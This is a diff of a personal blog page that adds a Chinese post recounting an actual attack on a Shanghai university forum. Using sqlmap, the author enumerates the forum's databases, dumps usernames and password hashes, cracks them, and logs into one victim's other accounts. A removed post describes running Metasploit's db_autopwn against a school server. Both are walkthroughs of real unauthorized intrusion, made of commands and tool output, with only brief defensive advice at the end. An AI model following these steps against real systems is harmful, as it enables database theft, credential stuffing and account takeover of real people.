@@ -116,7 +116,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 17.5px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 15px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a>
+						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/Linux/" style="font-size: 12.5px;">Linux</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 17.5px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 17.5px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a>
 					</div>
 				</section>
 				
@@ -191,6 +191,100 @@
 </nav>
 
       <div class="body-wrap">
+  
+    <article id="post-2016-03-06-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/06/2016-03-06-sqlmap/" class="article-date">
+  	<time datetime="2016-03-06T11:40:25.000Z" itemprop="datePublished">2016-03-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/06/2016-03-06-sqlmap/">一桩由sqlmap引发的血案</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。</li>
+</ul>
+<h3 id="sqlmap_u7684_u4E00_u822C_u7528_u6CD5"><a href="#sqlmap_u7684_u4E00_u822C_u7528_u6CD5" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sqlmap</span> -u <span class="string">"url"</span></span><br></pre></td></tr></table></figure></p>
+<p>知道目标URL后可以用:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure></p>
+<p>得到了下面的数据库信息:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases <span class="string">[5]</span>:</span><br><span class="line"><span class="string">[*]</span> bbscore</span><br><span class="line"><span class="string">[*]</span> bbscore_db</span><br><span class="line"><span class="string">[*]</span> information_schema</span><br><span class="line"><span class="string">[*]</span> mysql</span><br><span class="line"><span class="string">[*]</span> performance_schema</span><br></pre></td></tr></table></figure></p>
+<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="keyword">u</span> <span class="string">"url"</span> -<span class="keyword">D</span> bbscore --tables</span><br></pre></td></tr></table></figure></p>
+<p>得到了下面的表信息:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Database: bbscore</span><br><span class="line">[83 tables]</span><br><span class="line">+-----------------+</span><br><span class="line">|<span class="string"> action          </span>|</span><br><span class="line">|<span class="string"> user            </span>|</span><br><span class="line">|<span class="string"> admin           </span>|</span><br><span class="line">|<span class="string"> admin_memberfee </span>|</span><br><span class="line">|<span class="string"> admin_operlog   </span>|</span><br><span class="line">|<span class="string"> area            </span>|</span><br><span class="line">|<span class="string"> area_class      </span>|</span><br><span class="line">|<span class="string"> area_rule       </span>|</span><br><span class="line">|<span class="string"> art_pool        </span>|</span><br><span class="line">|<span class="string"> ban             </span>|</span><br><span class="line">|<span class="string"> banner          </span>|</span><br><span class="line">|<span class="string"> bbsvars         </span>|</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
+<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">--columns</span></span><br></pre></td></tr></table></figure></p>
+<p>得到下面的信息:<br><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] fetching columns for table <span class="variable">'user</span>' in database <span class="variable">'bbscore</span>'</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: <span class="number">30</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: id</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: int<span class="list">(<span class="keyword">10</span>)</span> unsigned</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: username</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">16</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: passwd</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: varchar<span class="list">(<span class="keyword">32</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: face</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: smallint<span class="list">(<span class="keyword">6</span>)</span></span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: sex</span><br><span class="line"><span class="list">[<span class="keyword">09:46:22</span>] <span class="list">[<span class="keyword">INFO</span>] resumed: tinyint<span class="list">(<span class="keyword">4</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><br></pre></td></tr></table></figure></p>
+<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -D bbscore -T <span class="keyword">user</span> <span class="title">-C</span> username,passwd --dump</span><br></pre></td></tr></table></figure></p>
+<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
+<h3 id="u610F_u5916_u7684_u60CA_u559C"><a href="#u610F_u5916_u7684_u60CA_u559C" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
+<ol>
+<li>这个用户名少见，不容易和其他单词混淆</li>
+<li>该用户可能在多处使用了相同用户名  </li>
+</ol>
+<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
+<h3 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
+<ul>
+<li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
+<li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
+<li>多处使用相同用户名和密码，一个账户信息外泄致使所有账户存在安全风险。</li>
+</ul>
+<p>如何应对？</p>
+<ul>
+<li>使用强密码是行之有效的措施</li>
+<li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
+<li>开启两步验证等方式，（手机验证码）</li>
+</ul>
+<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
+<blockquote>
+<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap/">sqlmap</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-2016-02-27-pi" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -719,81 +813,6 @@ GPIOs <span class="number">0</span><span class="number">-53</span>, platform/<sp
       
 	<div class="article-category tagcloud">
 	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-2015-12-01-msfpostgres" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/12/01/2015-12-01-msfpostgres/" class="article-date">
-  	<time datetime="2015-12-01T03:40:25.000Z" itemprop="datePublished">2015-12-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/01/2015-12-01-msfpostgres/">Metasploit连接数据库</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li>最近的事情真的有点多-_-#在搞飞思卡尔的比赛，在搞学院的本科生研究发展计划，在学习蛋疼的模电，在搞入侵测试233，貌似接下来两周还有一个c++考试和英语六级…… 好长时间不写博客，也好长时间没写代码了。昨天在Kali Linux上尝试了下连通postgres数据库并进行了自动化攻击测试。这篇算是一个小小的备忘录。<br><h2>Linux上PostgreSQL的启用</h2><br>终端命令:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p></p><h2>数据库配置</h2><br>设置密码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql postgres</span><br></pre></td></tr></table></figure><p></p>
-<p>进入数据库:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su postgres</span><br></pre></td></tr></table></figure></p>
-<p>创建用户和设置密码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createuser user -P</span><br></pre></td></tr></table></figure></p>
-<p></p><h2>Metasploit配置</h2><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf &gt; db_connect  <span class="comment">//可以不输入后面的参数，它会给例子</span></span><br><span class="line">msf &gt; db_hosts    <span class="comment">//列出数据库中的hosts</span></span><br><span class="line">msf &gt; db_status   <span class="comment">//查看数据库状态</span></span><br><span class="line">msf &gt; db_hosts -d &lt;ip&gt; <span class="comment">//删除数据中的某个host</span></span><br></pre></td></tr></table></figure><p></p>
-<p></p><h2>自动化渗透流程</h2><br>Nmap扫描，结果保存在数据库中:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -v -A -n &lt;ip&gt;   <span class="comment">//参数根据你的需要</span></span><br></pre></td></tr></table></figure><p></p>
-<p>查看数据库中的hosts，建议留一个host渗透:-)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_hosts</span><br></pre></td></tr></table></figure></p>
-<p>载入自动化攻击模块，并使用:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load db_autopwn</span><br><span class="line">db_autopwn -t -p -r -e</span><br></pre></td></tr></table></figure></p>
-<p>msf会提示你它不建议你使用这个，原因不清楚。我想大概是有违Hack精神吧233，毕竟脚本是人家写的。  </p>
-<ul>
-<li>我前两天用Nessus顺便扫了下学校的C语言课程的服务器，跑着Windows Server 2003的系统，还有Apache，貌似漏洞一堆还开了VNC服务，我尝试用了自动化渗透工具搞了一下，并没有sessions。所以说自动化渗透的成功率是相当低的。不管怎么说，metasploit还是有很多东西需要学习的，怎么能懒到搞自动化渗透呢233</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
 	</div>
 
 
